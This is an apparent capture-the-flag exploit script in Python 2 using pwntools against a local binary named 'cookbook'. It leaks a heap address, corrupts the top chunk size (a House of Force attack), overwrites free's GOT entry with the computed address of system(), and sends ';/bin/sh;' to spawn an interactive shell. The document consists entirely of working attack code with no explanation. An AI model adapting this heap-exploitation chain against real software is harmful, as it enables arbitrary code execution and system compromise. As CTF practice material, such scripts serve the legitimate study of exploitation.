#!/usr/bin/python
from pwn13 import *
import ctypes

free_got = 0x804d018

def sol():
    p.sendline("a")
    print p.recvuntil("t)?\n")
    p.sendline("n")
    print p.recvuntil("t)?\n")
    p.sendline("d")
    print p.recvuntil("t)?\n")
    p.sendline("q")
    print p.recvuntil("it\n")
    p.sendline("g")
    print p.recvuntil(": ")
    p.sendline("84")
    p.sendline("a"*4)
    print p.recvuntil("it\n")
    p.sendline("a")
    print p.recvuntil("t)?\n")
    p.sendline("n")
    print p.recvuntil("t)?\n")
    p.sendline("l")
    print p.recvuntil("price: ")
    data = p.recvline()[:-1]
    top_chunk_addr = int(data) + 0x520
    print 'top chunk', hex(top_chunk_addr)

    print p.recvuntil("t)?\n")

    p.sendline("q")
    print p.recvuntil("it\n")
    p.sendline("c")
    print p.recvuntil("it\n")
    p.sendline("n")
    print p.recvuntil("it\n")

    p.heap(0x1700, 0x300)
    p.sendline("i")
    payload = "A"*896
    payload += p32(0xffffffff)
    p.sendline(payload)
    print p.recvuntil("it\n")

    p.heap(0x1700, 0x300)

    p.sendline("q")
    print p.recvuntil("it\n")

    p.dump(0x0804d000, 0x200)

    p.sendline("g")
    print p.recvuntil(": ")
    size = ctypes.c_uint32(free_got - 34 - top_chunk_addr).value
    print 'size', str(hex(size))[2:]
    p.sendline(str(hex(size))[2:])
    p.sendline("AAAA")
    print p.recvuntil("it\n")

    p.dump(0x0804d000, 0x200)


    p.sendline("a")
    print p.recvuntil("t)?\n")
    p.sendline("n")
    print p.recvuntil("t)?\n")
    p.sendline("l")
    print p.recvuntil("price: ")
    data = p.recvline()[:-1]
    addr = ctypes.c_uint32(int(data)).value
    print hex(addr)
    libc_base = addr - 0x13da80
    system_addr = libc_base + 0x3ada0
    print 'libc_base', hex(libc_base)
    print p.recvuntil("t)?\n")
    p.dump(0x0804d000, 0x300)

    p.sendline("g")
    p.sendline(p32(system_addr)+";/bin/sh;")
    p.interactive()



if __name__ == "__main__":
    p = process("./cookbook")
    print p.sendlineafter("?","freestar")
    print p.recvuntil("t\n")

    sol()

    p.close()
